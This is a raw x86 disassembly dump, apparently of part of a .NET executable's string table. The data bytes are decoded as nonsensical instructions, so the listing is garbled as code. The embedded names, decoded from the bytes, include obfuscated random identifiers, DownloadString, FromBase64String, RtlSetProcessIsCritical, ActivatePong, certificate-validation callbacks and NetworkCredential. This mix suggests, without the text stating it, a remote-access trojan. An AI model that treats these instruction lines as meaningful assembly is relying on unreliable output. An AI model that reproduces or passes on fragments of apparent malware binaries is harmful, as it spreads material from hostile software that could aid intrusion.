  408ac4:	57                   	push   %edi
  408ac5:	66 00 50 48          	data16 add %dl,0x48(%eax)
  408ac9:	57                   	push   %edi
  408aca:	56                   	push   %esi
  408acb:	41                   	inc    %ecx
  408acc:	44                   	inc    %esp
  408acd:	49                   	dec    %ecx
  408ace:	69 4f 69 5a 66 00 51 	imul   $0x5100665a,0x69(%edi),%ecx
  408ad5:	59                   	pop    %ecx
  408ad6:	41                   	inc    %ecx
  408ad7:	62 47 44             	bound  %eax,0x44(%edi)
  408ada:	71 68                	jno    0x408b44
  408adc:	63 4f 4f             	arpl   %ecx,0x4f(%edi)
  408adf:	63 66 00             	arpl   %esp,0x0(%esi)
  408ae2:	69 63 56 50 6c 7a 5a 	imul   $0x5a7a6c50,0x56(%ebx),%esp
  408ae9:	72 71                	jb     0x408b5c
  408aeb:	73 70                	jae    0x408b5d
  408aed:	66 00 58 61          	data16 add %bl,0x61(%eax)
  408af1:	61                   	popa
  408af2:	78 72                	js     0x408b66
  408af4:	44                   	inc    %esp
  408af5:	67 44                	addr16 inc %esp
  408af7:	77 66                	ja     0x408b5f
  408af9:	00 53 52             	add    %dl,0x52(%ebx)
  408afc:	4b                   	dec    %ebx
  408afd:	63 65 77             	arpl   %esp,0x77(%ebp)
  408b00:	56                   	push   %esi
  408b01:	62 41 70             	bound  %eax,0x70(%ecx)
  408b04:	6d                   	insl   (%dx),%es:(%edi)
  408b05:	78 66                	js     0x408b6d
  408b07:	00 58 73             	add    %bl,0x73(%eax)
  408b0a:	77 66                	ja     0x408b72
  408b0c:	74 46                	je     0x408b54
  408b0e:	75 57                	jne    0x408b67
  408b10:	69 59 44 4a 67 00 73 	imul   $0x7300674a,0x44(%ecx),%ebx
  408b17:	50                   	push   %eax
  408b18:	4d                   	dec    %ebp
  408b19:	48                   	dec    %eax
  408b1a:	4e                   	dec    %esi
  408b1b:	4e                   	dec    %esi
  408b1c:	45                   	inc    %ebp
  408b1d:	55                   	push   %ebp
  408b1e:	46                   	inc    %esi
  408b1f:	61                   	popa
  408b20:	55                   	push   %ebp
  408b21:	4e                   	dec    %esi
  408b22:	67 00 67 4e          	add    %ah,0x4e(%bx)
  408b26:	59                   	pop    %ecx
  408b27:	4c                   	dec    %esp
  408b28:	58                   	pop    %eax
  408b29:	58                   	pop    %eax
  408b2a:	72 76                	jb     0x408ba2
  408b2c:	4a                   	dec    %edx
  408b2d:	51                   	push   %ecx
  408b2e:	50                   	push   %eax
  408b2f:	67 00 68 43          	add    %ch,0x43(%bx,%si)
  408b33:	62 4a 71             	bound  %ecx,0x71(%edx)
  408b36:	77 73                	ja     0x408bab
  408b38:	56                   	push   %esi
  408b39:	58                   	pop    %eax
  408b3a:	45                   	inc    %ebp
  408b3b:	4a                   	dec    %edx
  408b3c:	58                   	pop    %eax
  408b3d:	6f                   	outsl  %ds:(%esi),(%dx)
  408b3e:	69 63 5a 63 67 00 65 	imul   $0x65006763,0x5a(%ebx),%esp
  408b45:	6b 66 63 74          	imul   $0x74,0x63(%esi),%esp
  408b49:	55                   	push   %ebp
  408b4a:	73 4f                	jae    0x408b9b
  408b4c:	78 73                	js     0x408bc1
  408b4e:	77 7a                	ja     0x408bca
  408b50:	67 67 00 43 72       	addr16 add %al,0x72(%bp,%di)
  408b55:	79 70                	jns    0x408bc7
  408b57:	74 6f                	je     0x408bc8
  408b59:	43                   	inc    %ebx
  408b5a:	6f                   	outsl  %ds:(%esi),(%dx)
  408b5b:	6e                   	outsb  %ds:(%esi),(%dx)
  408b5c:	66 69 67 00 67 65    	imul   $0x6567,0x0(%edi),%sp
  408b62:	74 5f                	je     0x408bc3
  408b64:	50                   	push   %eax
  408b65:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b6c:	5f                   	pop    %edi
  408b6d:	50                   	push   %eax
  408b6e:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408b75:	74 65                	je     0x408bdc
  408b77:	6d                   	insl   (%dx),%es:(%edi)
  408b78:	2e 54                	cs push %esp
  408b7a:	68 72 65 61 64       	push   $0x64616572
  408b7f:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408b86:	5f                   	pop    %edi
  408b87:	50                   	push   %eax
  408b88:	61                   	popa
  408b89:	64 64 69 6e 67 00 61 	fs imul $0x64646100,%fs:0x67(%esi),%ebp
  408b90:	64 64 
  408b92:	5f                   	pop    %edi
  408b93:	53                   	push   %ebx
  408b94:	65 73 73             	gs jae 0x408c0a
  408b97:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408b9e:	6e                   	outsb  %ds:(%esi),(%dx)
  408b9f:	67 00 55 54          	add    %dl,0x54(%di)
  408ba3:	46                   	inc    %esi
  408ba4:	38 45 6e             	cmp    %al,0x6e(%ebp)
  408ba7:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408baa:	69 6e 67 00 53 79 73 	imul   $0x73795300,0x67(%esi),%ebp
  408bb1:	74 65                	je     0x408c18
  408bb3:	6d                   	insl   (%dx),%es:(%edi)
  408bb4:	2e 44                	cs inc %esp
  408bb6:	72 61                	jb     0x408c19
  408bb8:	77 69                	ja     0x408c23
  408bba:	6e                   	outsb  %ds:(%esi),(%dx)
  408bbb:	67 2e 49             	addr16 cs dec %ecx
  408bbe:	6d                   	insl   (%dx),%es:(%edi)
  408bbf:	61                   	popa
  408bc0:	67 69 6e 67 00 53 79 	imul   $0x73795300,0x67(%bp),%ebp
  408bc7:	73 
  408bc8:	74 65                	je     0x408c2f
  408bca:	6d                   	insl   (%dx),%es:(%edi)
  408bcb:	2e 52                	cs push %edx
  408bcd:	75 6e                	jne    0x408c3d
  408bcf:	74 69                	je     0x408c3a
  408bd1:	6d                   	insl   (%dx),%es:(%edi)
  408bd2:	65 2e 56             	gs cs push %esi
  408bd5:	65 72 73             	gs jb  0x408c4b
  408bd8:	69 6f 6e 69 6e 67 00 	imul   $0x676e69,0x6e(%edi),%ebp
  408bdf:	46                   	inc    %esi
  408be0:	72 6f                	jb     0x408c51
  408be2:	6d                   	insl   (%dx),%es:(%edi)
  408be3:	42                   	inc    %edx
  408be4:	61                   	popa
  408be5:	73 65                	jae    0x408c4c
  408be7:	36 34 53             	ss xor $0x53,%al
  408bea:	74 72                	je     0x408c5e
  408bec:	69 6e 67 00 54 6f 42 	imul   $0x426f5400,0x67(%esi),%ebp
  408bf3:	61                   	popa
  408bf4:	73 65                	jae    0x408c5b
  408bf6:	36 34 53             	ss xor $0x53,%al
  408bf9:	74 72                	je     0x408c6d
  408bfb:	69 6e 67 00 44 6f 77 	imul   $0x776f4400,0x67(%esi),%ebp
  408c02:	6e                   	outsb  %ds:(%esi),(%dx)
  408c03:	6c                   	insb   (%dx),%es:(%edi)
  408c04:	6f                   	outsl  %ds:(%esi),(%dx)
  408c05:	61                   	popa
  408c06:	64 53                	fs push %ebx
  408c08:	74 72                	je     0x408c7c
  408c0a:	69 6e 67 00 54 6f 53 	imul   $0x536f5400,0x67(%esi),%ebp
  408c11:	74 72                	je     0x408c85
  408c13:	69 6e 67 00 67 65 74 	imul   $0x74656700,0x67(%esi),%ebp
  408c1a:	5f                   	pop    %edi
  408c1b:	41                   	inc    %ecx
  408c1c:	73 53                	jae    0x408c71
  408c1e:	74 72                	je     0x408c92
  408c20:	69 6e 67 00 73 65 74 	imul   $0x74657300,0x67(%esi),%ebp
  408c27:	5f                   	pop    %edi
  408c28:	41                   	inc    %ecx
  408c29:	73 53                	jae    0x408c7e
  408c2b:	74 72                	je     0x408c9f
  408c2d:	69 6e 67 00 47 65 74 	imul   $0x74654700,0x67(%esi),%ebp
  408c34:	53                   	push   %ebx
  408c35:	74 72                	je     0x408ca9
  408c37:	69 6e 67 00 53 75 62 	imul   $0x62755300,0x67(%esi),%ebp
  408c3e:	73 74                	jae    0x408cb4
  408c40:	72 69                	jb     0x408cab
  408c42:	6e                   	outsb  %ds:(%esi),(%dx)
  408c43:	67 00 53 79          	add    %dl,0x79(%bp,%di)
  408c47:	73 74                	jae    0x408cbd
  408c49:	65 6d                	gs insl (%dx),%es:(%edi)
  408c4b:	2e 44                	cs inc %esp
  408c4d:	72 61                	jb     0x408cb0
  408c4f:	77 69                	ja     0x408cba
  408c51:	6e                   	outsb  %ds:(%esi),(%dx)
  408c52:	67 00 67 65          	add    %ah,0x65(%bx)
  408c56:	74 5f                	je     0x408cb7
  408c58:	41                   	inc    %ecx
  408c59:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c5d:	61                   	popa
  408c5e:	74 65                	je     0x408cc5
  408c60:	50                   	push   %eax
  408c61:	6f                   	outsl  %ds:(%esi),(%dx)
  408c62:	6e                   	outsb  %ds:(%esi),(%dx)
  408c63:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c67:	74 5f                	je     0x408cc8
  408c69:	41                   	inc    %ecx
  408c6a:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  408c6e:	61                   	popa
  408c6f:	74 65                	je     0x408cd6
  408c71:	50                   	push   %eax
  408c72:	6f                   	outsl  %ds:(%esi),(%dx)
  408c73:	6e                   	outsb  %ds:(%esi),(%dx)
  408c74:	67 00 73 65          	add    %dh,0x65(%bp,%di)
  408c78:	74 5f                	je     0x408cd9
  408c7a:	45                   	inc    %ebp
  408c7b:	72 72                	jb     0x408cef
  408c7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408c7e:	72 44                	jb     0x408cc4
  408c80:	69 61 6c 6f 67 00 75 	imul   $0x7500676f,0x6c(%ecx),%esp
  408c87:	6e                   	outsb  %ds:(%esi),(%dx)
  408c88:	6d                   	insl   (%dx),%es:(%edi)
  408c89:	72 49                	jb     0x408cd4
  408c8b:	6d                   	insl   (%dx),%es:(%edi)
  408c8c:	68 42 75 67 00       	push   $0x677542
  408c91:	68 63 6e 64 54       	push   $0x54646e63
  408c96:	76 52                	jbe    0x408cea
  408c98:	42                   	inc    %edx
  408c99:	75 79                	jne    0x408d14
  408c9b:	6c                   	insb   (%dx),%es:(%edi)
  408c9c:	62 7a 67             	bound  %edi,0x67(%edx)
  408c9f:	00 58 65             	add    %bl,0x65(%eax)
  408ca2:	5a                   	pop    %edx
  408ca3:	4a                   	dec    %edx
  408ca4:	57                   	push   %edi
  408ca5:	4b                   	dec    %ebx
  408ca6:	52                   	push   %edx
  408ca7:	7a 58                	jp     0x408d01
  408ca9:	70 6f                	jo     0x408d1a
  408cab:	53                   	push   %ebx
  408cac:	49                   	dec    %ecx
  408cad:	68 00 43 42 50       	push   $0x50424300
  408cb2:	47                   	inc    %edi
  408cb3:	56                   	push   %esi
  408cb4:	4c                   	dec    %esp
  408cb5:	64 50                	fs push %eax
  408cb7:	53                   	push   %ebx
  408cb8:	76 4f                	jbe    0x408d09
  408cba:	68 00 7a 68 6c       	push   $0x6c687a00
  408cbf:	73 67                	jae    0x408d28
  408cc1:	73 6b                	jae    0x408d2e
  408cc3:	56                   	push   %esi
  408cc4:	46                   	inc    %esi
  408cc5:	62 7a 65             	bound  %edi,0x65(%edx)
  408cc8:	4c                   	dec    %esp
  408cc9:	77 5a                	ja     0x408d25
  408ccb:	68 00 4c 4a 57       	push   $0x574a4c00
  408cd0:	45                   	inc    %ebp
  408cd1:	54                   	push   %esp
  408cd2:	4a                   	dec    %edx
  408cd3:	77 68                	ja     0x408d3d
  408cd5:	65 68 00 61 50 79    	gs push $0x79506100
  408cdb:	51                   	push   %ecx
  408cdc:	57                   	push   %edi
  408cdd:	43                   	inc    %ebx
  408cde:	63 47 66             	arpl   %eax,0x66(%edi)
  408ce1:	68 00 6a 52 6e       	push   $0x6e526a00
  408ce6:	64 78 4c             	fs js  0x408d35
  408ce9:	55                   	push   %ebp
  408cea:	4b                   	dec    %ebx
  408ceb:	7a 4f                	jp     0x408d3c
  408ced:	6f                   	outsl  %ds:(%esi),(%dx)
  408cee:	4d                   	dec    %ebp
  408cef:	77 4c                	ja     0x408d3d
  408cf1:	6a 68                	push   $0x68
  408cf3:	00 43 6f             	add    %al,0x6f(%ebx)
  408cf6:	6d                   	insl   (%dx),%es:(%edi)
  408cf7:	70 75                	jo     0x408d6e
  408cf9:	74 65                	je     0x408d60
  408cfb:	48                   	dec    %eax
  408cfc:	61                   	popa
  408cfd:	73 68                	jae    0x408d67
  408cff:	00 56 65             	add    %dl,0x65(%esi)
  408d02:	72 69                	jb     0x408d6d
  408d04:	66 79 48             	data16 jns 0x408d4f
  408d07:	61                   	popa
  408d08:	73 68                	jae    0x408d72
  408d0a:	00 46 6c             	add    %al,0x6c(%esi)
  408d0d:	75 73                	jne    0x408d82
  408d0f:	68 00 67 65 74       	push   $0x74656700
  408d14:	5f                   	pop    %edi
  408d15:	45                   	inc    %ebp
  408d16:	78 65                	js     0x408d7d
  408d18:	63 75 74             	arpl   %esi,0x74(%ebp)
  408d1b:	61                   	popa
  408d1c:	62 6c 65 50          	bound  %ebp,0x50(%ebp,%eiz,2)
  408d20:	61                   	popa
  408d21:	74 68                	je     0x408d8b
  408d23:	00 47 65             	add    %al,0x65(%edi)
  408d26:	74 54                	je     0x408d7c
  408d28:	65 6d                	gs insl (%dx),%es:(%edi)
  408d2a:	70 50                	jo     0x408d7c
  408d2c:	61                   	popa
  408d2d:	74 68                	je     0x408d97
  408d2f:	00 67 65             	add    %ah,0x65(%edi)
  408d32:	74 5f                	je     0x408d93
  408d34:	4c                   	dec    %esp
  408d35:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d37:	67 74 68             	addr16 je 0x408da2
  408d3a:	00 54 78 51          	add    %dl,0x51(%eax,%edi,2)
  408d3e:	54                   	push   %esp
  408d3f:	7a 4c                	jp     0x408d8d
  408d41:	51                   	push   %ecx
  408d42:	67 71 4f             	addr16 jno 0x408d94
  408d45:	74 4b                	je     0x408d92
  408d47:	75 68                	jne    0x408db1
  408d49:	00 6d 66             	add    %ch,0x66(%ebp)
  408d4c:	50                   	push   %eax
  408d4d:	44                   	inc    %esp
  408d4e:	4b                   	dec    %ebx
  408d4f:	71 72                	jno    0x408dc3
  408d51:	71 6d                	jno    0x408dc0
  408d53:	77 68                	ja     0x408dbd
  408d55:	00 6d 5a             	add    %ch,0x5a(%ebp)
  408d58:	61                   	popa
  408d59:	63 51 41             	arpl   %edx,0x41(%ecx)
  408d5c:	4e                   	dec    %esi
  408d5d:	58                   	pop    %eax
  408d5e:	67 79 47             	addr16 jns 0x408da8
  408d61:	69 00 63 6a 76 55    	imul   $0x55766a63,(%eax),%eax
  408d67:	4e                   	dec    %esi
  408d68:	44                   	inc    %esp
  408d69:	54                   	push   %esp
  408d6a:	79 41                	jns    0x408dad
  408d6c:	73 4b                	jae    0x408db9
  408d6e:	69 00 59 61 42 57    	imul   $0x57426159,(%eax),%eax
  408d74:	65 6e                	outsb  %gs:(%esi),(%dx)
  408d76:	42                   	inc    %edx
  408d77:	4e                   	dec    %esi
  408d78:	51                   	push   %ecx
  408d79:	75 44                	jne    0x408dbf
  408d7b:	51                   	push   %ecx
  408d7c:	59                   	pop    %ecx
  408d7d:	69 00 49 67 77 45    	imul   $0x45776749,(%eax),%eax
  408d83:	68 5a 61 48 62       	push   $0x6248615a
  408d88:	69 00 5a 71 4e 44    	imul   $0x444e715a,(%eax),%eax
  408d8e:	49                   	dec    %ecx
  408d8f:	74 64                	je     0x408df5
  408d91:	62 50 6c             	bound  %edx,0x6c(%eax)
  408d94:	64 69 00 61 55 4a 77 	imul   $0x774a5561,%fs:(%eax),%eax
  408d9b:	6b 52 49 7a          	imul   $0x7a,0x49(%edx),%edx
  408d9f:	73 45                	jae    0x408de6
  408da1:	55                   	push   %ebp
  408da2:	75 6a                	jne    0x408e0e
  408da4:	69 00 55 72 69 00    	imul   $0x697255,(%eax),%eax
  408daa:	6d                   	insl   (%dx),%es:(%edi)
  408dab:	67 66 75 4e          	addr16 data16 jne 0x408dfd
  408daf:	72 4b                	jb     0x408dfc
  408db1:	61                   	popa
  408db2:	47                   	inc    %edi
  408db3:	7a 69                	jp     0x408e1e
  408db5:	00 76 7a             	add    %dh,0x7a(%esi)
  408db8:	59                   	pop    %ecx
  408db9:	67 67 56             	addr16 addr16 push %esi
  408dbc:	62 4d 58             	bound  %ecx,0x58(%ebp)
  408dbf:	70 44                	jo     0x408e05
  408dc1:	6a 00                	push   $0x0
  408dc3:	49                   	dec    %ecx
  408dc4:	71 6d                	jno    0x408e33
  408dc6:	63 79 42             	arpl   %edi,0x42(%ecx)
  408dc9:	44                   	inc    %esp
  408dca:	75 61                	jne    0x408e2d
  408dcc:	4d                   	dec    %ebp
  408dcd:	51                   	push   %ecx
  408dce:	49                   	dec    %ecx
  408dcf:	6a 00                	push   $0x0
  408dd1:	62 55 73             	bound  %edx,0x73(%ebp)
  408dd4:	50                   	push   %eax
  408dd5:	43                   	inc    %ebx
  408dd6:	53                   	push   %ebx
  408dd7:	61                   	popa
  408dd8:	6e                   	outsb  %ds:(%esi),(%dx)
  408dd9:	4d                   	dec    %ebp
  408dda:	76 57                	jbe    0x408e33
  408ddc:	49                   	dec    %ecx
  408ddd:	6a 00                	push   $0x0
  408ddf:	79 42                	jns    0x408e23
  408de1:	67 55                	addr16 push %ebp
  408de3:	51                   	push   %ecx
  408de4:	70 46                	jo     0x408e2c
  408de6:	6a 4c                	push   $0x4c
  408de8:	53                   	push   %ebx
  408de9:	6a 00                	push   $0x0
  408deb:	58                   	pop    %eax
  408dec:	68 47 76 58 49       	push   $0x49587647
  408df1:	66 4b                	dec    %bx
  408df3:	63 6a 00             	arpl   %ebp,0x0(%edx)
  408df6:	6a 48                	push   $0x48
  408df8:	6a 75                	push   $0x75
  408dfa:	54                   	push   %esp
  408dfb:	65 4a                	gs dec %edx
  408dfd:	4f                   	dec    %edi
  408dfe:	70 75                	jo     0x408e75
  408e00:	47                   	inc    %edi
  408e01:	61                   	popa
  408e02:	6a 6a                	push   $0x6a
  408e04:	00 56 47             	add    %dl,0x47(%esi)
  408e07:	63 67 48             	arpl   %esp,0x48(%edi)
  408e0a:	62 4e 4b             	bound  %ecx,0x4b(%esi)
  408e0d:	58                   	pop    %eax
  408e0e:	74 6a                	je     0x408e7a
  408e10:	00 6a 6b             	add    %ch,0x6b(%edx)
  408e13:	48                   	dec    %eax
  408e14:	66 56                	push   %si
  408e16:	65 69 6b 66 4a 4d 7a 	imul   $0x6a7a4d4a,%gs:0x66(%ebx),%ebp
  408e1d:	6a 
  408e1e:	00 68 49             	add    %ch,0x49(%eax)
  408e21:	63 44 7a 57          	arpl   %eax,0x57(%edx,%edi,2)
  408e25:	4a                   	dec    %edx
  408e26:	43                   	inc    %ebx
  408e27:	41                   	inc    %ecx
  408e28:	55                   	push   %ebp
  408e29:	4d                   	dec    %ebp
  408e2a:	45                   	inc    %ebp
  408e2b:	6b 00 51             	imul   $0x51,(%eax),%eax
  408e2e:	6c                   	insb   (%dx),%es:(%edi)
  408e2f:	67 61                	addr16 popa
  408e31:	79 66                	jns    0x408e99
  408e33:	77 48                	ja     0x408e7d
  408e35:	70 71                	jo     0x408ea8
  408e37:	67 53                	addr16 push %ebx
  408e39:	6b 00 41             	imul   $0x41,(%eax),%eax
  408e3c:	73 79                	jae    0x408eb7
  408e3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408e3f:	63 43 61             	arpl   %eax,0x61(%ebx)
  408e42:	6c                   	insb   (%dx),%es:(%edi)
  408e43:	6c                   	insb   (%dx),%es:(%edi)
  408e44:	62 61 63             	bound  %esp,0x63(%ecx)
  408e47:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e4a:	65 6d                	gs insl (%dx),%es:(%edi)
  408e4c:	6f                   	outsl  %ds:(%esi),(%dx)
  408e4d:	74 65                	je     0x408eb4
  408e4f:	43                   	inc    %ebx
  408e50:	65 72 74             	gs jb  0x408ec7
  408e53:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  408e5a:	56                   	push   %esi
  408e5b:	61                   	popa
  408e5c:	6c                   	insb   (%dx),%es:(%edi)
  408e5d:	69 64 61 74 69 6f 6e 	imul   $0x436e6f69,0x74(%ecx,%eiz,2),%esp
  408e64:	43 
  408e65:	61                   	popa
  408e66:	6c                   	insb   (%dx),%es:(%edi)
  408e67:	6c                   	insb   (%dx),%es:(%edi)
  408e68:	62 61 63             	bound  %esp,0x63(%ecx)
  408e6b:	6b 00 54             	imul   $0x54,(%eax),%eax
  408e6e:	69 6d 65 72 43 61 6c 	imul   $0x6c614372,0x65(%ebp),%ebp
  408e75:	6c                   	insb   (%dx),%es:(%edi)
  408e76:	62 61 63             	bound  %esp,0x63(%ecx)
  408e79:	6b 00 52             	imul   $0x52,(%eax),%eax
  408e7c:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  408e83:	4b 65 
  408e85:	79 50                	jns    0x408ed7
  408e87:	65 72 6d             	gs jb  0x408ef7
  408e8a:	69 73 73 69 6f 6e 43 	imul   $0x436e6f69,0x73(%ebx),%esi
  408e91:	68 65 63 6b 00       	push   $0x6b6365
  408e96:	46                   	inc    %esi
  408e97:	6c                   	insb   (%dx),%es:(%edi)
  408e98:	75 73                	jne    0x408f0d
  408e9a:	68 46 69 6e 61       	push   $0x616e6946
  408e9f:	6c                   	insb   (%dx),%es:(%edi)
  408ea0:	42                   	inc    %edx
  408ea1:	6c                   	insb   (%dx),%es:(%edi)
  408ea2:	6f                   	outsl  %ds:(%esi),(%dx)
  408ea3:	63 6b 00             	arpl   %ebp,0x0(%ebx)
  408ea6:	68 54 46 67 78       	push   $0x78674654
  408eab:	75 4e                	jne    0x408efb
  408ead:	45                   	inc    %ebp
  408eae:	53                   	push   %ebx
  408eaf:	69 6b 00 4c 77 70 74 	imul   $0x7470774c,0x0(%ebx),%ebp
  408eb6:	69 6f 66 52 6b 6b 6b 	imul   $0x6b6b6b52,0x66(%edi),%ebp
  408ebd:	00 71 65             	add    %dh,0x65(%ecx)
  408ec0:	6c                   	insb   (%dx),%es:(%edi)
  408ec1:	6c                   	insb   (%dx),%es:(%edi)
  408ec2:	45                   	inc    %ebp
  408ec3:	4a                   	dec    %edx
  408ec4:	66 6b 6c 51 70 4c    	imul   $0x4c,0x70(%ecx,%edx,2),%bp
  408eca:	6c                   	insb   (%dx),%es:(%edi)
  408ecb:	6b 00 5a             	imul   $0x5a,(%eax),%eax
  408ece:	4d                   	dec    %ebp
  408ecf:	76 61                	jbe    0x408f32
  408ed1:	49                   	dec    %ecx
  408ed2:	46                   	inc    %esi
  408ed3:	79 64                	jns    0x408f39
  408ed5:	78 4e                	js     0x408f25
  408ed7:	6d                   	insl   (%dx),%es:(%edi)
  408ed8:	6b 00 65             	imul   $0x65,(%eax),%eax
  408edb:	71 59                	jno    0x408f36
  408edd:	75 66                	jne    0x408f45
  408edf:	51                   	push   %ecx
  408ee0:	6d                   	insl   (%dx),%es:(%edi)
  408ee1:	58                   	pop    %eax
  408ee2:	43                   	inc    %ebx
  408ee3:	71 6b                	jno    0x408f50
  408ee5:	00 4b 4e             	add    %cl,0x4e(%ebx)
  408ee8:	41                   	inc    %ecx
  408ee9:	49                   	dec    %ecx
  408eea:	53                   	push   %ebx
  408eeb:	6e                   	outsb  %ds:(%esi),(%dx)
  408eec:	63 54 70 4f          	arpl   %edx,0x4f(%eax,%esi,2)
  408ef0:	66 48                	dec    %ax
  408ef2:	4e                   	dec    %esi
  408ef3:	6c                   	insb   (%dx),%es:(%edi)
  408ef4:	00 67 62             	add    %ah,0x62(%edi)
  408ef7:	58                   	pop    %eax
  408ef8:	66 4f                	dec    %di
  408efa:	71 49                	jno    0x408f45
  408efc:	70 45                	jo     0x408f43
  408efe:	5a                   	pop    %edx
  408eff:	54                   	push   %esp
  408f00:	6c                   	insb   (%dx),%es:(%edi)
  408f01:	00 4a 46             	add    %cl,0x46(%edx)
  408f04:	7a 41                	jp     0x408f47
  408f06:	43                   	inc    %ebx
  408f07:	6b 6b 42 50          	imul   $0x50,0x42(%ebx),%ebp
  408f0b:	74 79                	je     0x408f86
  408f0d:	58                   	pop    %eax
  408f0e:	6c                   	insb   (%dx),%es:(%edi)
  408f0f:	00 52 74             	add    %dl,0x74(%edx)
  408f12:	6c                   	insb   (%dx),%es:(%edi)
  408f13:	53                   	push   %ebx
  408f14:	65 74 50             	gs je  0x408f67
  408f17:	72 6f                	jb     0x408f88
  408f19:	63 65 73             	arpl   %esp,0x73(%ebp)
  408f1c:	73 49                	jae    0x408f67
  408f1e:	73 43                	jae    0x408f63
  408f20:	72 69                	jb     0x408f8b
  408f22:	74 69                	je     0x408f8d
  408f24:	63 61 6c             	arpl   %esp,0x6c(%ecx)
  408f27:	00 4e 65             	add    %cl,0x65(%esi)
  408f2a:	74 77                	je     0x408fa3
  408f2c:	6f                   	outsl  %ds:(%esi),(%dx)
  408f2d:	72 6b                	jb     0x408f9a
  408f2f:	43                   	inc    %ebx
  408f30:	72 65                	jb     0x408f97
  408f32:	64 65 6e             	fs outsb %gs:(%esi),(%dx)
  408f35:	74 69                	je     0x408fa0
  408f37:	61                   	popa
  408f38:	6c                   	insb   (%dx),%es:(%edi)
  408f39:	00 53 79             	add    %dl,0x79(%ebx)
  408f3c:	73 74                	jae    0x408fb2
  408f3e:	65 6d                	gs insl (%dx),%es:(%edi)
  408f40:	2e 53                	cs push %ebx
  408f42:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408f46:	69 74 79 2e 50 72 69 	imul   $0x6e697250,0x2e(%ecx,%edi,2),%esi
  408f4d:	6e 
  408f4e:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f51:	61                   	popa
  408f52:	6c                   	insb   (%dx),%es:(%edi)
  408f53:	00 57 69             	add    %dl,0x69(%edi)
  408f56:	6e                   	outsb  %ds:(%esi),(%dx)
  408f57:	64 6f                	outsl  %fs:(%esi),(%dx)
  408f59:	77 73                	ja     0x408fce
  408f5b:	50                   	push   %eax
  408f5c:	72 69                	jb     0x408fc7
  408f5e:	6e                   	outsb  %ds:(%esi),(%dx)
  408f5f:	63 69 70             	arpl   %ebp,0x70(%ecx)
  408f62:	61                   	popa
  408f63:	6c                   	insb   (%dx),%es:(%edi)
  408f64:	00 67 65             	add    %ah,0x65(%edi)
  408f67:	74 5f                	je     0x408fc8
  408f69:	49                   	dec    %ecx
  408f6a:	6e                   	outsb  %ds:(%esi),(%dx)
  408f6b:	74 65                	je     0x408fd2
  408f6d:	72 76                	jb     0x408fe5
  408f6f:	61                   	popa
  408f70:	6c                   	insb   (%dx),%es:(%edi)
  408f71:	00 73 65             	add    %dh,0x65(%ebx)
  408f74:	74 5f                	je     0x408fd5
  408f76:	49                   	dec    %ecx
  408f77:	6e                   	outsb  %ds:(%esi),(%dx)
  408f78:	74 65                	je     0x408fdf
  408f7a:	72 76                	jb     0x408ff2
  408f7c:	61                   	popa
  408f7d:	6c                   	insb   (%dx),%es:(%edi)
  408f7e:	00 57 42             	add    %dl,0x42(%edi)
  408f81:	4f                   	dec    %edi
  408f82:	6b 72 45 53          	imul   $0x53,0x45(%edx),%esi
  408f86:	55                   	push   %ebp
  408f87:	65 6c                	gs insb (%dx),%es:(%edi)
  408f89:	00 67 73             	add    %ah,0x73(%edi)
  408f8c:	51                   	push   %ecx
  408f8d:	6e                   	outsb  %ds:(%esi),(%dx)
  408f8e:	74 4c                	je     0x408fdc
  408f90:	77 55                	ja     0x408fe7
  408f92:	61                   	popa
  408f93:	68 72 45 59 67       	push   $0x67594572
  408f98:	6c                   	insb   (%dx),%es:(%edi)
  408f99:	00 6b 65             	add    %ch,0x65(%ebx)
  408f9c:	72 6e                	jb     0x40900c
  408f9e:	65 6c                	gs insb (%dx),%es:(%edi)
  408fa0:	33 32                	xor    (%edx),%esi
  408fa2:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fa5:	6c                   	insb   (%dx),%es:(%edi)
  408fa6:	00 75 73             	add    %dh,0x73(%ebp)
  408fa9:	65 72 33             	gs jb  0x408fdf
  408fac:	32 2e                	xor    (%esi),%ch
  408fae:	64 6c                	fs insb (%dx),%es:(%edi)
  408fb0:	6c                   	insb   (%dx),%es:(%edi)
  408fb1:	00 6e 74             	add    %ch,0x74(%esi)
  408fb4:	64 6c                	fs insb (%dx),%es:(%edi)
  408fb6:	6c                   	insb   (%dx),%es:(%edi)
  408fb7:	2e 64 6c             	cs fs insb (%dx),%es:(%edi)
  408fba:	6c                   	insb   (%dx),%es:(%edi)
  408fbb:	00 4b 69             	add    %cl,0x69(%ebx)
  408fbe:	6c                   	insb   (%dx),%es:(%edi)
  408fbf:	6c                   	insb   (%dx),%es:(%edi)
  408fc0:	00 50 6f             	add    %dl,0x6f(%eax)
  408fc3:	6c                   	insb   (%dx),%es:(%edi)
  408fc4:	6c                   	insb   (%dx),%es:(%edi)
  408fc5:	00 4e 6e             	add    %cl,0x6e(%esi)
  408fc8:	78 62                	js     0x40902c
  408fca:	42                   	inc    %edx
  408fcb:	49                   	dec    %ecx
  408fcc:	4d                   	dec    %ebp
  408fcd:	47                   	inc    %edi
  408fce:	76 6c                	jbe    0x40903c
  408fd0:	00 4d 6d             	add    %cl,0x6d(%ebp)
  408fd3:	57                   	push   %edi
  408fd4:	41                   	inc    %ecx
  408fd5:	44                   	inc    %esp
  408fd6:	62 66 58             	bound  %esp,0x58(%esi)
  408fd9:	79 4a                	jns    0x409025
  408fdb:	46                   	inc    %esi
  408fdc:	6d                   	insl   (%dx),%es:(%edi)
  408fdd:	00 41 6d             	add    %al,0x6d(%ecx)
  408fe0:	4b                   	dec    %ebx
  408fe1:	72 52                	jb     0x409035
  408fe3:	75 4c                	jne    0x409031
  408fe5:	52                   	push   %edx
